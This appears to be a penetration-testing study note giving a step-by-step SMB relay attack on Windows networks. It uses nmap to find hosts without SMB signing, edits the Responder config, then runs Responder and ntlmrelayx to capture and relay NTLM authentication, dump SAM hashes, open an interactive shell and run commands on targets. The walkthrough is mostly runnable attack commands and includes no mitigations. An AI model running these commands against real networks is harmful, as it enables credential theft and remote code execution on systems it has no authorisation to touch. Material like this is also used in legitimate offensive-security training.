# SMB Relay Attacks Overview

## What is SMB Relay?
Instead of cracking hashes gathered with Responder. We can relay those hashes to specific machines and potentially gain access.

**Requirements for SMB Relay:**
- SMB signing must be disabled or not enforced on the target.
- Relayed user credentials must be admin on machines.
- Cannot relay to self.

## Identify Host Without SMB Signing
**With Nmap:**
```bash
nmap --script=smb2-security-mode.nse -p445 <ip/CIDR>

nmap --script=smb2-security-mode.nse -p445 10.0.2.25

...
Message signing enabled but not required
...
```

## SMB Relay
**Step 1: Edit Responder config:**

```bash
sudo subl /etc/responder/Responder.conf

Responder Core]

; Servers to start
SQL = On
SMB = Off *
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On
HTTPS = Off *
DNS = On
LDAP = On
DCERPC = On
WINRM = On
SNMP = Off
MQTT = On
```

**Step 2: Run Responder:**
```bash
sudo responder -I eth0 -dw
```

**Step 3: Set up relay:**
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

**Step 4: Occur an event:**
For example trying to access the target machines ip in explorer: `\\attackerip`

**Step 5: Win:**
Dumps the SAM hashes.

*Other Wins:*
```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -i
```
This will try to get a interactive shell!

```bash
sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```
A basic command execution on the target machine.
